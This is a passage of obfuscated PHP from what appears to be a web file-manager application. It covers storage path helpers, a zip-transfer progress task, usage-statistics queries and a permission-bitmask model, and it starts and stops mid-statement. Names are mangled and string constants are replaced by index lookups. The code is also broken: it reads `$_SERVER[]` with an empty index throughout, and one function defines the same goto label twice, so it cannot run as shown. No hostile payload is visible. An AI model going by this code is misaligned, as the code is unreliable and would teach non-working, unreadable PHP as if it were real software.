rtrim($bʆ, $e؊[8]); goto c܍; DϳǏ: $a = $e؊[1165]; if (substr($bʆ, 0, 3) == $e؊[1166]) { $bʆ = substr($bʆ, 3); } while (strstr($bʆ, $a)) { $bʆ = str_replace($a, $e؊[8], $bʆ); } goto dɼ; f׃: $e؊ =& $_SERVER[]; $bʆ = str_replace(array($e؊[1039], $e؊[229]), $e؊[50], $bʆ); $bʆ = str_replace($e؊[97], $e؊[8], $bʆ); goto DϳǏ; c܍: return $bʆ; goto bξʎ; bξʎ: } public static function sourceID($d׎) { $F׫屋 =& $_SERVER[]; $e̱ = self::parse($d׎); if ($e̱[$F׫屋[29]] !== self::KOD_SOURCE) { show_json(LNG($F׫屋[1168]), !1); } return $e̱[$F׫屋[393]]; } public static function make($a阐Ӣ) { if (!$a阐Ӣ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($a阐Ӣ)); } public static function makeShare($Eމ, $A芆ݭ) { return self::makePath(self::KOD_SHARE_ITEM, $Eމ, $A芆ݭ); } public static function makeFileTypePath($c) { return self::makePath(self::KOD_USER_FILE_TYPE, $c); } public static function makeFileTagPath($D) { return self::makePath(self::KOD_USER_FILE_TAG, $D); } public static function makePath($fֿĦ, $bȸ = '', $aܑ = '') { $EԌڄ =& $_SERVER[]; $AúП = substr($fֿĦ, 1, -1); $C蟸ի = $EԌڄ[1169] . $AúП . $EԌڄ[1170] . $bȸ . $EԌڄ[1171]; $C蟸ի = $aܑ ? $C蟸ի . $aܑ . $EԌڄ[8] : $C蟸ի; return $C蟸ի; } public static function hashPath($d, $b狴 = true) { goto f݅; e: if (!$eŏ && isset($B޾[$d[395]])) { $B޾ = IO::info(KodIO::make($B޾[$d[395]])); $eŏ = _get($B޾, $d[1172], $d[33]); } if (!$eŏ && $b狴) { $f = KodIO::parse($B޾[$d[76]]); if (!$f[$d[29]]) { $eŏ = IO::hashSimple($B޾[$d[76]]); } } if (!$eŏ) { $eŏ = md5($B޾[$d[76]] . $B޾[$d[78]] . $B޾[$d[84]]); } goto A̳; f݅: $d =& $_SERVER[]; $B޾ = is_array($d) ? $d : IO::info($d); $eŏ = _get($B޾, $d[1172], $d[33]); goto e; A̳: return $eŏ; goto BЩ; BЩ: } public static function initSystemPath() { goto a֓; Fʾ: IOHistory::bindEvent(); goto E; a֓: $bث =& $_SERVER[]; if (defined($bث[1173])) { return; } define($bث[1173], self::systemPath($bث[1174])); goto f; f: define($bث[1175], self::systemPath($bث[1176])); define($bث[1177], self::systemPath($bث[1178])); define($bث[1179], self::systemPath($bث[1180])); goto Fʾ; E: } public static function systemPath($aŉ߸) { goto f; a: return $B; goto f; f: $FϟƖ =& $_SERVER[]; $aӅ = $FϟƖ[1181] . ucfirst($aŉ߸); $B = Model($FϟƖ[735])->get($aӅ); goto AᏉ; AᏉ: if ($B) { return $B; } if ($aŉ߸ == $FϟƖ[1174]) { $B = self::make(Model($FϟƖ[795])->systemRootPathAdd($FϟƖ[518])); } else { $B = self::systemPath($FϟƖ[1174]); $b񮳳 = self::sourceID($B); $B = self::make(Model($FϟƖ[795])->mkdir($b񮳳, $aŉ߸)); } Model($FϟƖ[735])->set($aӅ, $B); goto a; f: } public static function systemFolder($e) { $E = IO_PATH_SYSTEM_SOURCE . $e; $FÕ = Cache::get($E); if (!$FÕ) { $Bő = IO::infoFull($E); if (!$Bő) { $FÕ = IO::mkdir($E, REPEAT_SKIP); } else { $FÕ = $Bő[$_SERVER[][76]]; } Cache::set($E, $FÕ, 3600 * 10); } return $FÕ; } public static function defaultDriver() { return Model($_SERVER[][732])->defaultDriver(); } public static function defaultIO() { $fÞ =& $_SERVER[]; $b㛠¼ = self::defaultDriver(); return $fÞ[1182] . $b㛠¼[$fÞ[393]] . $fÞ[1171]; } public static function defaultDriverInit() { static $Dמ = false; if ($Dמ) { return $Dמ; } $Dמ = IO::init(self::defaultIO()); return $Dמ; } public static function fileTypeList() { $cڿ =& $_SERVER[]; $b = $GLOBALS[$cڿ[6]][$cڿ[1183]]; foreach ($b as $Aǵ => $C) { $b͙ = $cڿ[1184] . $Aǵ; $B = LNG($b͙); if ($b͙ != $B) { $b[$Aǵ][$cڿ[28]] = $B; } } return $b; } public static function transferType($FÔ, $fكʹ) { goto c; c: $bϥ =& $_SERVER[]; $Fح؞ = self::driverType($FÔ); $E = self::driverType($fكʹ); goto AƤ; AƤ: if ($Fح؞[$bϥ[29]] == $E[$bϥ[29]] && $Fح؞[$bϥ[1185]] == $E[$bϥ[1185]]) { return $bϥ[1186]; } if ($Fح؞[$bϥ[29]] == $bϥ[828] && $E[$bϥ[29]] == $bϥ[106]) { return $bϥ[1097]; } if ($Fح؞[$bϥ[29]] == $bϥ[106] && $E[$bϥ[29]] == $bϥ[828]) { return $bϥ[107]; } goto C; C: return $bϥ[1187]; goto a̽; a̽: } public static function driverType($b׭ڕ) { goto Eɿ; d: return array($Dɐ᲏[29] => $Dɐ᲏[828], $Dɐ᲏[1185] => $b׭ڕ->pathDriver, $Dɐ᲏[76] => $c); goto a螇; F쩞: if ($E۠ == $Dɐ᲏[723] || $E۠ == $Dɐ᲏[1189] || $E۠ == $Dɐ᲏[1190]) { $b׭ڕ = self::defaultDriverInit(); } else { if ($E۠ == $Dɐ᲏[1104] || $E۠ == $Dɐ᲏[1191]) { $b׭ڕ = IO::init($b׭ڕ->pathParse[$Dɐ᲏[1049]]); } } $E۠ = str_replace($Dɐ᲏[1188], $Dɐ᲏[33], strtolower($b׭ڕ->getType())); if ($E۠ == $Dɐ᲏[106]) { return array($Dɐ᲏[29] => $Dɐ᲏[106], $Dɐ᲏[1185] => $Dɐ᲏[33], $Dɐ᲏[76] => $c); } goto d; Eɿ: $Dɐ᲏ =& $_SERVER[]; $c = $b׭ڕ->path; $E۠ = str_replace($Dɐ᲏[1188], $Dɐ᲏[33], strtolower($b׭ڕ->getType())); goto F쩞; a螇: } } goto a╕; C폵ڄ: class TaskZip extends TaskFileTransfer { protected function startAfter() { $bϾ =& $_SERVER[]; parent::startAfter(); Hook::bind($bϾ[1626], array($this, $bϾ[1621])); $b鹝ç =& $this->task; $b鹝ç[$bϾ[1623]] = $bϾ[1097]; if (!$b鹝ç[$bϾ[1436]]) { $b鹝ç[$bϾ[1436]] = LNG($bϾ[1627]); } } protected function endAfter() { $EМޙ =& $_SERVER[]; parent::endAfter(); Hook::unbind($EМޙ[1626], array($this, $EМޙ[1621])); } public function updateAfter() { $aې =& $_SERVER[]; $cȍ֊ =& $this->task; if (!$cȍ֊[$aې[1022]] || !$cȍ֊[$aې[728]]) { return; } if ($cȍ֊[$aې[1623]] == $aې[1097]) { $Dֿ = $cȍ֊[$aې[1580]]; if ($cȍ֊[$aې[1581]] != $aې[1097]) { $Dֿ = 0; } $fәɴ = ($cȍ֊[$aې[1584]] + $Dֿ) / $cȍ֊[$aې[728]]; $cȍ֊[$aې[1534]] = $fәɴ * 0.3; } else { if ($cȍ֊[$aې[1623]] == $aې[311]) { $fәɴ = $cȍ֊[$aې[1037]] / $cȍ֊[$aې[1022]]; $cȍ֊[$aې[1534]] = 0.3 + $fәɴ * 0.5; } else { if ($cȍ֊[$aې[1623]] == $aې[107]) { $fәɴ = 0; if ($cȍ֊[$aې[1579]]) { $fәɴ = $cȍ֊[$aې[1580]] / $cȍ֊[$aې[1579]]; } $cȍ֊[$aې[1534]] = 0.3 + 0.5 + $fәɴ * 0.2; } } } if ($cȍ֊[$aې[1534]] > 0) { $A = timeFloat() - $cȍ֊[$aې[754]] - $cȍ֊[$aې[1537]]; $cȍ֊[$aې[1538]] = $A * (1 - $cȍ֊[$aې[1534]]) / $cȍ֊[$aې[1534]]; } } public function copyFileStart($f穷, $A, $CӤ, $c, $Cᆪ⠬, $bѺ) { $Cب =& $_SERVER[]; parent::copyFileStart($f穷, $A, $CӤ, $c, $Cᆪ⠬, $bѺ); $FҖ =& $this->task; if ($FҖ[$Cب[1623]] == $Cب[311]) { $FҖ[$Cب[1623]] = $Cب[107]; } $this->update(); } public function copyFileEnd($C؋, $e䏤, $c̄ų, $b漞, $cҌ, $Eֿ) { $FӸ =& $_SERVER[]; $E =& $this->task; $E[$FӸ[1580]] = $E[$FӸ[1579]]; $E[$FӸ[1584]] += $E[$FӸ[1579]]; $E[$FӸ[1581]] = $FӸ[33]; $this->update(); } public function nameParse($Bǌ) { $Cу =& $_SERVER[]; $C߆ =& $this->task; if ($C߆[$Cу[1037]] < $C߆[$Cу[1022]]) { $c = get_path_this($Bǌ); if (strstr($c, $Cу[95])) { $C߆[$Cу[1037]] += 1; } } if ($C߆[$Cу[1623]] == $Cу[1097]) { $C߆[$Cу[1623]] = $Cу[311]; } $C߆[$Cу[1577]] = $Bǌ; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($A֍) { $e =& $_SERVER[]; $c = array($e[575] => array($e[29] => $e[1628], $e[271] => array($e[222], $e[730], $e[1629], $e[1630])), $e[1631] => array($e[29] => $e[1632], $e[271] => array($e[222], $e[728], $e[1633], $e[1634], $e[1635]))); if (!isset($c[$A֍])) { return !1; } $this->optionType = $c[$A֍][$e[29]]; $this->field = $c[$A֍][$e[271]]; return !0; } public function listData($bত = false, $eݾ = "\x6d\157\144\151\x66\x79\x54\151\155\145", $Aҕ = false) { return parent::listData($bত, $eݾ, $Aҕ); } public function trendList($eʤָ) { goto fڷ; f: foreach ($f≠ެ as $a) { $this->{$C֍}($a); } return $this->listData(); goto C빱; C҆: if (!isset($f)) { $B·ά = $eʤָ == $bË֍[575] ? $bË֍[519] : $bË֍[795]; $f = Model($B·ά)->min($bË֍[194]); } $C֍ = $bË֍[1638] . ucfirst($eʤָ); $f≠ެ = $this->dateList($f); goto f; fڷ: $bË֍ =& $_SERVER[]; $dӕ = $this->listData(); if ($dӕ) { $e҄ = end($dӕ); $a = date($bË֍[1636], strtotime($bË֍[1637])); if ($e҄[$bË֍[222]] == $a) { return $dӕ; } $f = strtotime($e҄[$bË֍[222]]); } goto C҆; C빱: } private function dateList($FԨ) { $F̑ =& $_SERVER[]; $F = $FԨ; $eߎ = strtotime($F̑[1637]); $c⯱ = array(); while ($F <= $eߎ) { $c⯱[] = date($F̑[1636], $F); $F = strtotime($F̑[1639], $F); } return $c⯱; } public function _recordUser($DǠǑ = '') { goto eɖ; Bҍֵ: $bÈ = array($dȜ[222] => $DǠǑ, $dȜ[730] => (int) $f, $dȜ[1629] => (int) $d, $dȜ[1630] => (int) $AɃ); return $this->insert($bÈ); goto Fז; Eɜ՗: $d = Model($dȜ[519])->where($fي)->count($dȜ[1533]); $fي[$dȜ[29]] = $dȜ[1642]; $AɃ = Model($dȜ[1643])->where($fي)->count($dȜ[1644]); goto Bҍֵ; eɖ: $dȜ =& $_SERVER[]; $D퇝 = strtotime(date($dȜ[1640], strtotime($DǠǑ))); $fȚ = strtotime(date($dȜ[1641], strtotime($DǠǑ))); goto c򫎡ݏ; c򫎡ݏ: $fي = array($dȜ[194] => array($dȜ[972], $fȚ)); $f = Model($dȜ[519])->where($fي)->count($dȜ[1533]); $fي[$dȜ[194]] = array($dȜ[331], array($D퇝, $fȚ)); goto Eɜ՗; Fז: } public function _recordStore($cڎ = '') { goto EԹ; aŤ: $Aւ = Model($B֌ҟ[795])->where($C)->sum($B֌ҟ[78]); $d = array($B֌ҟ[222] => $cڎ, $B֌ҟ[728] => (int) $d, $B֌ҟ[1633] => (int) $E, $B֌ҟ[1634] => (int) $aū, $B֌ҟ[1635] => (int) $Aւ); return $this->insert($d); goto cҏ; fύ: $C[$B֌ҟ[404]] = 1; $aū = Model($B֌ҟ[795])->where($C)->sum($B֌ҟ[78]); $C[$B֌ҟ[404]] = 2; goto aŤ; D: $E = Model($B֌ҟ[450])->where($C)->sum($B֌ҟ[78]); $C[$B֌ҟ[403]] = 0; $d = Model($B֌ҟ[795])->where($C)->sum($B֌ҟ[78]); goto fύ; EԹ: $B֌ҟ =& $_SERVER[]; $AÍ = strtotime(date($B֌ҟ[1641], strtotime($cڎ))); $C = array($B֌ҟ[194] => array($B֌ҟ[972], $AÍ)); goto D; cҏ: } public function trend($c, $Fﱘ) { goto F; F: $eݿ =& $_SERVER[]; if (!$this->init($c)) { return !1; } $a = $this->trendList($c); goto d; FǢ: if (empty($a)) { $fμ = date($eݿ[1636], strtotime($eݿ[1637])); $C画瞟 = array($eݿ[222] => $fμ); foreach ($Fߍ[$c] as $cիݭ => $A󧴌) { $C画瞟[$cիݭ] = 0; } $a[] = $C画瞟; } $Cٗ = array(); foreach ($a as $A󧴌) { if ($c == $eݿ[1631] && $A󧴌[$eݿ[1633]] > $A󧴌[$eݿ[728]]) { $A󧴌[$eݿ[1633]] = $A󧴌[$eݿ[728]]; } foreach ($Fߍ[$c] as $cիݭ => $a֨ߩ) { $Dز = array($eݿ[222] => $A󧴌[$eݿ[222]], $eݿ[1436] => $a֨ߩ); $Dز[$c뽵ʜ[$c]] = isset($A󧴌[$cիݭ]) ? $A󧴌[$cիݭ] : 0; $Cٗ[] = $Dز; } } goto eՅ߈; eՅ߈: return $Cٗ; goto c; d: if ($a && $Fﱘ != $eݿ[1506]) { $AΆ氄 = $a[0][$eݿ[222]]; $eวԓ = $this->validDate($Fﱘ, $AΆ氄); $A = array(); $D = array_to_keyvalue($a, $eݿ[222]); foreach ($eวԓ as $fμ) { if (isset($D[$fμ])) { $Dز = $D[$fμ]; } else { $Dز = end($a); $Dز[$eݿ[222]] = $fμ; if ($c == $eݿ[575]) { $Dز[$eݿ[1629]] = $Dز[$eݿ[1630]] = 0; } } $A[] = $Dز; } $a = $A; } $Fߍ = array($eݿ[575] => array($eݿ[730] => LNG($eݿ[1645]), $eݿ[1629] => LNG($eݿ[1646]), $eݿ[1630] => LNG($eݿ[1647])), $eݿ[1631] => array($eݿ[728] => LNG($eݿ[1648]), $eݿ[1633] => LNG($eݿ[1649]), $eݿ[1634] => LNG($eݿ[1650]), $eݿ[1635] => LNG($eݿ[1651]))); $c뽵ʜ = array($eݿ[575] => $eݿ[1652], $eݿ[1631] => $eݿ[78]); goto FǢ; c: } public function validDate($dʕѣ, $dײ) { goto B; B蓌: return $e; goto C豼; B: $a؛ =& $_SERVER[]; $B = date($a؛[1636], strtotime($a؛[1637])); $e = array($B); goto A; A: switch ($dʕѣ) { case $a؛[1513]: $b̠ = mktime(0, 0, 0, date($a؛[1653]), date($a؛[1256]) - date($a؛[1317]) + 7 - 7, date($a؛[1654])); $B = 0; do { $FŢ = date($a؛[1636], $b̠ - 3600 * 24 * 7 * $B); $e[] = $FŢ; $B++; } while ($dײ < $FŢ); break; case $a؛[1511]: $B = 1; do { $E = date($a؛[1655], strtotime("\55\x20{$B}\40\155\157\156\164\150\x73")); $e[] = $E; $B++; } while ($dײ < $E); break; case $a؛[1656]: $A϶􂨗 = (int) date($a؛[1654], strtotime($dײ)); $fč = (int) date($a؛[1654]); if ($A϶􂨗 >= $fč) { break; } for ($A϶􂨗; $A϶􂨗 < $fč; $A϶􂨗++) { $e[] = $A϶􂨗 . $a؛[1657]; } break; default: break; } if ($dײ > end($e)) { array_pop($e); } sort($e); goto B蓌; C豼: } public function listTable($E) { $cЅ = ucfirst($E); return Model($cЅ)->listData(); } public function option($bѿ) { $c = $_SERVER[][1658] . ucfirst($bѿ); return $this->{$c}(); } private function optionUser() { goto bǐ⛽; bǐ⛽: $Cˏԏ =& $_SERVER[]; $f奌 = Model($Cˏԏ[519])->count($Cˏԏ[1533]); $b̓ = Model($Cˏԏ[519])->where($Cˏԏ[1659])->count($Cˏԏ[1533]); goto dԘ; C󕨍: return array($Cˏԏ[724] => (int) $f奌, $Cˏԏ[1661] => (int) ($f奌 - $b̓), $Cˏԏ[1662] => (int) $b̓, $Cˏԏ[1663] => (int) $aʔ񈅳, $Cˏԏ[1664] => $Fۦξ); goto CΕ硴; cݨػ: if (!$Fۦξ) { $Fۦξ = 1; } $cжڑ = array($Cˏԏ[1660] => array($Cˏԏ[973], $a׻)); $aʔ񈅳 = Model($Cˏԏ[519])->where($cжڑ)->count($Cˏԏ[1533]); goto C󕨍; dԘ: $f󛳶 = intval($GLOBALS[$Cˏԏ[6]][$Cˏԏ[347]][$Cˏԏ[1492]]) / 3600; $B = strtotime("\x2d{$f󛳶}\x20\x68\157\x75\x72\x73"); $a׻ = strtotime(date($Cˏԏ[1640])); goto A; A: if ($B < $a׻) { $B = $a׻; } $cжڑ = array($Cˏԏ[1660] => array($Cˏԏ[973], $B)); $Fۦξ = (int) Model($Cˏԏ[519])->where($cжڑ)->count($Cˏԏ[1533]); goto cݨػ; CΕ硴: } private function optionFile() { goto Aѳ; B͆ţ: $a܎î = Model($cĤ[795])->where($f)->sum($cĤ[78]); $C˹ = Model($cĤ[795])->where($f)->count($cĤ[395]); return array($cĤ[728] => $Bӯ, $cĤ[1633] => $aЊԝ, $cĤ[1665] => $Bӯ - $aЊԝ, $cĤ[1666] => (int) $a܎î, $cĤ[730] => (int) $eĠζ, $cĤ[1667] => (int) $C˹); goto dɛ; CѸ: $aЊԝ = $E韙[$cĤ[1633]]; $eĠζ = Model($cĤ[795])->where(array($cĤ[403] => 0))->count($cĤ[395]); $f = array($cĤ[403] => 0, $cĤ[194] => array($cĤ[973], strtotime(date($cĤ[1640])))); goto B͆ţ; Aѳ: $cĤ =& $_SERVER[]; $E韙 = $this->sourceSize(); $Bӯ = $E韙[$cĤ[78]]; goto CѸ; dɛ: } private function optionAccess() { $C֤ȷ =& $_SERVER[]; return array($C֤ȷ[724] => $this->typeLogCnt(), $C֤ȷ[107] => $this->typeLogCnt($C֤ȷ[107]), $C֤ȷ[430] => $this->typeLogCnt($C֤ȷ[430]), $C֤ȷ[1668] => $this->typeLogCnt($C֤ȷ[1668]), $C֤ȷ[1669] => $this->typeLogCnt($C֤ȷ[1669]), $C֤ȷ[575] => $this->typeLogCnt($C֤ȷ[33], $C֤ȷ[1644])); } private function typeLogCnt($F˅ = '', $B꥝ = "\151\144") { goto EߴՆ; EߴՆ: $b =& $_SERVER[]; $aȦ = array($b[107] => array($b[1670], $b[1671]), $b[430] => array($b[1672], $b[1673]), $b[1668] => array($b[1674], $b[1675], $b[1676]), $b[1669] => array($b[1677], $b[1678]), $b[1679] => array($b[1680], $b[1681], $b[1682])); $E = strtotime(date($b[1640])); goto c; c: $b = array($b[194] => array($b[973], $E)); if ($F˅) { $b[$b[29]] = array($b[7], $aȦ[$F˅]); } $d = Model($b[1643])->where($b)->count($B꥝); goto fߐζ; fߐζ: return (int) $d; goto bˢ; bˢ: } private function optionServer() { goto fڱގ; FȪݴ: if ($D͈Ю == $CÎ[760]) { $b = explode($CÎ[1170], $c脿[$CÎ[933]]); $D͈Ю = $b[0]; } if ($D͈Ю == $CÎ[763] || $D͈Ю == $CÎ[764]) { $b󙹂 = Model()->db()->query($CÎ[1683]); $b֋ = $b󙹂[0] && isset($b󙹂[0][$CÎ[1435]]) ? $b󙹂[0][$CÎ[1435]] : 0; $D͈Ю = $CÎ[1684] . ($b֋ ? $CÎ[8] . $b֋ : $CÎ[33]); } $C = $GLOBALS[$CÎ[6]][$CÎ[347]][$CÎ[797]]; goto b; fڱގ: $CÎ =& $_SERVER[]; $Dҍ = $this->diskDriver(); $cɻĆ = KodIO::defaultDriver(); goto eƶﮠ; b: return array($CÎ[1685] => $Dҍ ? $Dҍ[$CÎ[1686]] : 0, $CÎ[1687] => $Dҍ ? $Dҍ[$CÎ[1688]] : 0, $CÎ[1689] => (int) $cɻĆ[$CÎ[1686]] * 1024 * 1024 * 1024, $CÎ[1690] => (int) $a̷, $CÎ[1691] => ucfirst($b݅), $CÎ[1692] => $CÎ[1693] . PHP_VERSION, $CÎ[1694] => phpBuild64() ? 64 : 32, $CÎ[723] => str_replace($CÎ[1695], $CÎ[950], $D͈Ю), $CÎ[347] => ucfirst($C), $CÎ[28] => $_SERVER[$CÎ[1696]]); goto c֒Ɏ; eƶﮠ: $D = array($CÎ[787] => $cɻĆ[$CÎ[393]]); $a̷ = Model($CÎ[450])->where($D)->sum($CÎ[78]); $a՟ = explode($CÎ[50], $_SERVER[$CÎ[142]]); goto d; d: $b݅ = $a՟[0]; $c脿 = $GLOBALS[$CÎ[6]][$CÎ[17]]; $D͈Ю = $c脿[$CÎ[934]]; goto FȪݴ; c֒Ɏ: } private function diskDriver() { goto AČ; f߄ǐ: $aڈ = $EĴ - @disk_free_space($f✊); return array($bϐ[1686] => $EĴ, $bϐ[1688] => $aڈ); goto cػެ; aӃ: if ($CՐ) { $f✊ = $bϐ[1699]; if (function_exists($bϐ[1700])) { exec($bϐ[1701], $Bݱà); $f✊ = $Bݱà[1] . $bϐ[8]; } } if (!file_exists($f✊)) { return; } $EĴ = @disk_total_space($f✊); goto f߄ǐ; AČ: $bϐ =& $_SERVER[]; $f✊ = $bϐ[8]; $CՐ = $GLOBALS[$bϐ[6]][$bϐ[1697]] == $bϐ[1698]; goto aӃ; cػެ: } public function fileChart($e洎) { goto eѣ; d񸍻: $D͆ = $this->sourceSize(); $D = array($bҧ[478] => 0, $bҧ[404] => 1); $c㺥 = Model($bҧ[795])->where($D)->sum($bҧ[78]); goto Aո; Aո: $D[$bҧ[404]] = 2; $d = Model($bҧ[795])->where($D)->sum($bҧ[78]); return array($bҧ[728] => $D͆[$bҧ[78]], $bҧ[1633] => $D͆[$bҧ[1633]], $bҧ[1634] => (int) $c㺥, $bҧ[1635] => (int) $d); goto e; eѣ: $bҧ =& $_SERVER[]; if (isset($e洎[$bҧ[1533]])) { return Model($bҧ[795])->userFileTypeProfile($e洎[$bҧ[1533]]); } if (isset($e洎[$bҧ[1702]])) { return Model($bҧ[795])->groupFileTypeProfile($e洎[$bҧ[1702]]); } goto d񸍻; e: } private function sourceSize() { $a߇ =& $_SERVER[]; $F = Model($a߇[795])->where(array($a߇[403] => 0))->sum($a߇[78]); $Aʷ = Model($a߇[450])->sum($a߇[78]); if ($Aʷ > $F) { $Aʷ = $F; } return array($a߇[78] => (int) $F, $a߇[1633] => (int) $Aʷ); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $D華 =& $_SERVER[]; $a¥ = array(array($D華[413] => LNG($D華[1703]), $D華[1704] => $D華[1705], $D華[1706] => 1, $D華[1707] => 1, $D華[1708] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($D華[413] => LNG($D華[1709]), $D華[1704] => $D華[1710], $D華[1706] => 2, $D華[1707] => 1, $D華[1708] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($D華[413] => LNG($D華[1711]), $D華[1704] => $D華[1712], $D華[1706] => 3, $D華[1707] => 1, $D華[1708] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($D華[413] => LNG($D華[1713]), $D華[1704] => $D華[1714], $D華[1706] => 4, $D華[1707] => 1, $D華[1708] => self::AUTH_SHOW | self::AUTH_VIEW), array($D華[413] => LNG($D華[1715]), $D華[1704] => $D華[1716], $D華[1706] => 5, $D華[1707] => 1, $D華[1708] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($D華[413] => LNG($D華[1717]), $D華[1704] => $D華[1718], $D華[1706] => 6, $D華[1707] => 1, $D華[1708] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($D華[413] => LNG($D華[1719]), $D華[1704] => $D華[1720], $D華[1706] => 7, $D華[1707] => 1, $D華[1708] => 0)); return $a¥; } public static function authCheck($D, $Dϊ) { $D = intval($D); if ($GLOBALS[$_SERVER[][485]]) { return !0; } if ($D <= 0) { return !1; } if (($D & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($D & $Dϊ); } public static function authCheckShow($a) { return self::authCheck($a, self::AUTH_SHOW); } public static function authCheckView($d匣) { return self::authCheck($d匣, self::AUTH_VIEW); } public static function authCheckDownload($C) { return self::authCheck($C, self::AUTH_DOWNLOAD); } public static function authCheckUpload($e⛯) { return self::authCheck($e⛯, self::AUTH_UPLOAD); } public static function authCheckEdit($d) { return self::authCheck($d, self::AUTH_EDIT); } public static function authCheckRemove($fǦ) { return self::authCheck($fǦ, self::AUTH_REMOVE); } public static function authCheckShare($f˚) { return self::authCheck($f˚, self::AUTH_SHARE); } public static function authCheckComment($Bؑԑ) { return self::authCheck($Bؑԑ, self::AUTH_COMMENT); } public static function authCheckEvent($e圠) { return self::authCheck($e圠, self::AUTH_EVENT); } public static function authCheckRoot($d) { return self::authCheck($d, self::AUTH_ROOT); } public static function authCheckAction($AɊ, $eǙ؞ކ) { goto Eٲ; Eٲ: $c =& $_SERVER[]; $Aì = array($c[1721] => self::AUTH_VIEW, $c[1097] => self::AUTH_DOWNLOAD, $c[107] => self::AUTH_UPLOAD, $c[1669] => self::AUTH_EDIT, $c[1668] => self::AUTH_REMOVE, $c[1679] => self::AUTH_SHARE, $c[352] => self::AUTH_COMMENT, $c[1521] => self::AUTH_EVENT, $c[1722] => self::AUTH_ROOT); if (!isset($Aì[$eǙ؞ކ])) { return; } goto bӋ; B: if (($AɊ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($AɊ & $b); goto Fռ; bӋ: $b = $Aì[$eǙ؞ކ]; $AɊ = intval($AɊ); if ($AɊ <= 0) { return !1; } goto B; Fռ: } public static function authDisable($fҐ, $d) { if (intval($fҐ) <= 0) { return 0; } return intval($fҐ) & ~$d; } public $optionType = "\123\171\163\x74\145\155\x2e\163\x6f\x75\x72\143\x65\x41\x75\x74\150\114\151\163\164"; public $field = array("\156\x61\155\x65", "\x61\165\x74\150", "\154\141\x62\145\x6c", "\x64\x69\x73\160\154\x61\171", "\x73\x79\163\164\x65\155", "\x73\x6f\162\x74"); public function initData() { $Cߏ = $this->authDefault(); foreach ($Cߏ as $F) { $this->add($F); } } public function findAuth($B, $C) { $Də =& $_SERVER[]; $f焞 = parent::listData(); foreach ($f焞 as $aڄ) { $A΢ޱ = intval($aڄ[$Də[406]]); if ($A΢ޱ <= 0 || $aڄ[$Də[1723]] == 0) { continue; } if (($A΢ޱ & $B) != $B) { continue; } if (($A΢ޱ & $C) != 0) { continue; } return $aڄ[$Də[393]]; } return !1; } public function findAuthReadOnly() { $Dȝ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $AТ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($Dȝ, $AТ); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function listData($d = false, $dΚҗ = "\163\157\x72\x74", $C؛ = false) { return parent::listData($d, $dΚҗ, $C؛); } public function update($d, $f؉) { $a׽ =& $_SERVER[]; $f = parent::listData($d); $a頣 = $this->findByName($f؉[$a׽[28]]); if (!$f || $a頣 && $a頣[$a׽[393]] != $f[$a׽[393]]) { return !1; } $this->filterAuth($f؉[$a׽[406]]); return parent::update($d, $f؉); } public function remove($Aں) { $e讱컶 = parent::listData($Aں); if (!$e讱컶 || $e讱컶[$_SERVER[][1174]]) { return !1; } return parent::remove($Aں); } public function add($D = array()) { goto eԮ˗; eԮ˗: $Aд =& $_SERVER[]; if ($this->findByName($D[$Aд[28]])) { return !1; } $fڥ = array($Aд[28] => $Aд[33], $Aд[406] => 1, $Aд[1724] => $Aд[1712], $Aд[1723] => 1, $Aд[1174] => 0, $Aд[1725] => 0); goto F; C귆: return parent::insert($D); goto D밌; F: $D = array_merge($fڥ, $D); $D[$Aд[1725]] = $this->getSort(); $this->filterAuth($D[$Aд[406]]); goto C귆; D밌: } private function getSort() { $f˂ =& $_SERVER[]; $F󝶽 = parent::listData(); $Bޗ = array_to_keyvalue($F󝶽, $f˂[33], $f˂[1725]); return empty($Bޗ) ? 0 : max($Bޗ) + 1; } private function filterAuth(&$AӚ) { goto dϲ; dϲ: if (!$AӚ) { return; } $DԴ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $Fۊ = array(); goto fتӘ; fتӘ: foreach ($DԴ as $a) { if ($AӚ & $a) { $Fۊ[] = $a; } } if (in_array(self::AUTH_ROOT, $Fۊ)) { $AӚ = array_sum($DԴ); return; } $aό = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto Eߨ̟; Eߨ̟: foreach ($Fۊ as $a) { if (isset($aό[$a])) { $Fۊ = 